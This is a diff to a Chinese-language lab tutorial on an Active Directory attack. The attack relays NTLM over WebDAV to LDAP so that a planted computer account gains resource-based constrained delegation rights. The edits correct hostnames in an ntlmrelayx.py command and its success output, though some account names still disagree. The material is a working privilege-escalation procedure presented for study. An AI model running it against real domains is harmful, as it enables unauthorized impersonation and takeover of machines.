@@ -82,14 +82,14 @@ New-MachineAccount -MachineAccount evil-pc -Password (ConvertTo-SecureString -St
 使用ntlmrelayx.py工具，在AD-00發起一個NTLM relay server
 
 ```powershell
-ntlmrelayx.py --no-smb-server --delegate-access --escalate-user evilpc$ -t ldap://ad-dc.contoso.com
+ntlmrelayx.py --no-smb-server --delegate-access --escalate-user evil-pc$ -t ldap://ad-dc.contoso.com
 ```
 
 - **--no-smb-server**:不發起SMB Server，因為此處是使用WEBDAV服務(HTTP)作為NTLM的載體。
 
 - **--delegate-access**:定義在ntlm relay後，要向ad-dc變更AD-01的RBCD權限
 
- - **--escalate-user evilpc$** 使$evilpc擁有AD-01的RBCD權限。
+ - **--escalate-user evilpc$** 使evil-pc$擁有AD-01的RBCD權限。
 
  - **-t ldap://ad-dc.contoso.com** 定義ntlm relay的目標，此處為使用ldap協議向ad-dc發起RBCD的權限變更。
 
@@ -111,15 +111,15 @@ NTLM為一個內嵌的認證協議，實際上可運用在HTTP、LDAP以及SMB�
 - 如果攻擊成功將會在ad-00的NTLM relay的程式視窗看到以下結果: 
 
 ```
-[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://adsec-dc.contoso.com
-[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://adsec-dc.contoso.com
-[*] Authenticating against ldap://adsec-dc.contoso.com as CONTOSO\adsec-01$ SUCCEED
+[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://ad-dc.contoso.com
+[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://ad-dc.contoso.com
+[*] Authenticating against ldap://ad-dc.contoso.com as CONTOSO\adsec-01$ SUCCEED
 [*] Enumerating relayed user's privileges. This may take a while on large domains
-[*] Authenticating against ldap://adsec-dc.contoso.com as CONTOSO\adsec-01$ SUCCEED
+[*] Authenticating against ldap://ad-dc.contoso.com as CONTOSO\ad-01$ SUCCEED
 [*] Enumerating relayed user's privileges. This may take a while on large domains
-[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://adsec-dc.contoso.com
+[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://ad-dc.contoso.com
 [*] Delegation rights modified succesfully!
-[*] evilpc$ can now impersonate users on ADSEC-01$ via S4U2Proxy
+[*] evilpc$ can now impersonate users on AD-01$ via S4U2Proxy
 ```
 
 PowerView 可查看 ad-01成功對evil-pc這個computer account授予RBCD權限。
